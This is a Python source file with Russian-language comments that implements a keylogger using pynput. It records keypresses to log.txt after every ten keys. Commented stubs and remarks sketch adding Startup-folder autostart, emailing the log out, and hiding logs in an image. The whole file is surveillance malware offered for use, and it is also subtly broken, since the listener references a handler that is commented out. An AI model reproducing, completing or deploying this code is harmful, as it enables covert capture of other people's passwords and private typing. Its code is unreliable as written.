import pynput
from pynput.keyboard import Key, Listener
import os

#  Если поменяешь название незабудь поменять внизу
class Keylogger():
	# Создаю переменные
	def __init__(self):
		self.count = 0
		self.keys = []

	# Проверяю на нажатие кнопки
	def on_press(self, key):
		print(f"{key} press")
		# добовляю символы в список, что бы потом кинуть их в файл log.txt
		self.keys.append(key)
		self.count += 1
		# Если юзер нажал 10 символов они идут в файл log txt
		if self.count >= 10:
			self.write_f(self.keys)


	# МОЖНО РАЗКОМЕНТИРОВАТЬ, но при нажатии на esc файл закроется
	# def on_relese(self, key):
	# 	if key == Key.esc:
	# 		return False

	def write_f(self, keys):
		# название файла можно поменять)
		with open("log.txt", "w") as f:
			for key in self.keys:
				# Убераю ковычки
				k = str(key).replace("'", "")
				# тут когда кто то нажимает пробел, переноситься в log на следующую строку
				if k.find("space") > 0:
					f.write("\n")
				# тута я делаю, что бы не было вот такого key.space
				elif k.find('Key') == -1:
					f.write(k)
# авто загрузка недоделал(лень))))
#def auto(filing):
#	os.system("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/СЮДА ФАЙЛ Log.txt")
#


# if __name__ == '__main__': от сюда начинает работать прога!!!
if __name__ == '__main__':
	#auto(ФАЙЛ) - если доделал вато загрузку ракоментируй
	# создаю обьект, если поменяешь название класса не забудь поменять тут!!!
	obj = Keylogger()
	with Listener(on_press = obj.on_press, on_relese = obj.on_relese) as listener:
		listener.join()


# с почтой мне лень делать, если будешь делать то вспомни, что тебе нужно отправлять файл log.txt, но тебе нужно знать его располрожение!!!
# Можно вместо log.txt помещать логи в картинку, только нужна картинка)))
